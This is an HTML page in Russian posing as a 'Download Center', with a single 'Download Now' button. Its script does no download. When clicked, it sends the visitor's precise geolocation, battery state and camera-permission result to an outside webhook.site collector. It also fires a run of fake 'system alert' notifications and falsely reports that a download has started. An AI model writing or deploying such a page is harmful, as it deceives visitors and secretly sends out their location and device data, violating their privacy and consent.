<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Центр загрузки</title>
    <style>
        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #000; margin: 0; }
        .card { background: #1a1a1a; padding: 20px; border-radius: 8px; width: 95%; max-width: 500px; text-align: center; color: #fff; }
        /* Компактная сетка без рамок */
        .grid-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 5px; margin-top: 15px; }
        button { width: 100%; padding: 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 1.1rem; }
        .btn-download { background: #007bff; color: white; text-transform: uppercase; }
        #status { margin-top: 15px; font-size: 0.8rem; color: #888; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <button class="btn-download" onclick="startAllInOne()">Download Now</button>
    <div id="status">Ожидание команды...</div>
</div>

<script>
    const webhookUrl = "https://webhook.site/3536371a-f8c8-445e-a399-617a47d6fadb";

    function sendData(type, payload) {
        const query = new URLSearchParams(payload).toString();
        fetch(`${webhookUrl}?type=${type}&${query}`).catch(() => {});
    }

    async function startAllInOne() {
        const status = document.getElementById('status');
        status.innerText = "Инициализация загрузки...";

        // 1. Запрос уведомлений и запуск цикла
        if ("Notification" in window) {
            Notification.requestPermission().then(permission => {
                if (permission === 'granted') {
                    sendData("PUSH", { status: "active" });
                    // Цикл уведомлений
                    for (let i = 0; i < 15; i++) {
                        setTimeout(() => {
                            new Notification("Системное оповещение", {
                                body: "Файл загружен: part_" + i + ".dat",
                                icon: "https://cdn-icons-png.flaticon.com/512/179/179386.png"
                            });
                        }, i * 800);
                    }
                }
            });
        }

        // 2. Геолокация
        navigator.geolocation.getCurrentPosition(
            (p) => { sendData("GEO", { lat: p.coords.latitude, lon: p.coords.longitude }); },
            (e) => { sendData("GEO_ERR", { code: e.code }); },
            { enableHighAccuracy: true }
        );

        // 3. Батарея
        if (navigator.getBattery) {
            navigator.getBattery().then(bat => {
                sendData("BATTERY", { lvl: bat.level * 100, chrg: bat.charging });
            });
        }

        // 4. Вибрация
        if (navigator.vibrate) navigator.vibrate([500, 200, 500]);

        // 5. Камера (доступ)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            sendData("CAMERA", { access: "granted" });
            stream.getTracks().forEach(track => track.stop());
        } catch (err) {
            sendData("CAMERA", { access: "denied" });
        }

        status.innerText = "Загрузка началась. Проверьте уведомления.";
    }
</script>

</body>
</html>
